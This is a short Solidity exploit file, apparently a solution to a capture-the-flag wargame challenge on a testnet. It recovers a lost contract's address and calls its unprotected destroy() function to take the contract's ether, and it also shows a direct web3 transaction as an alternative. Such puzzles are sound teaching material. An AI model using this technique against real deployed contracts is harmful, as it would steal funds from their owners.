// 1 - Find the deployed contract using Rinkeby - 0xa4469D5D34C9541Ed27C16b0285629F87f2493Db
// 2 - Deploy this contract using the SimpleToken address - Remix
// 2 - Call attack()

// Addresses can also be created using last 20 bytes of hash of rlp encoding of tx.origin and tx.nonce
// keccak256(rlp(senderAddress, nonce))[12:31]
// Check recovery.js

pragma solidity ^0.6.0;

interface IRecovery {
    function destroy(address payable _to) external;
}

contract RecoveryAttacker {
    IRecovery public recovery;

    constructor(address challengeAddress) public payable {
        recovery = IRecovery(challengeAddress);
    }

    function attack() external {
        recovery.destroy(msg.sender);
    }
}

// Alternately, we can also send transaction directly instead of writing a smart contract
// as demonstrated below:
// data = web3.eth.abi.encodeFunctionCall({
//     name: 'destroy',
//     type: 'function',
//     inputs: [{
//         type: 'address',
//         name: '_to'
//     }]
// }, [player]);
// await web3.eth.sendTransaction({
//     to: "<insert the address of the lost contract>",
//     from: player,
//     data: data
// })
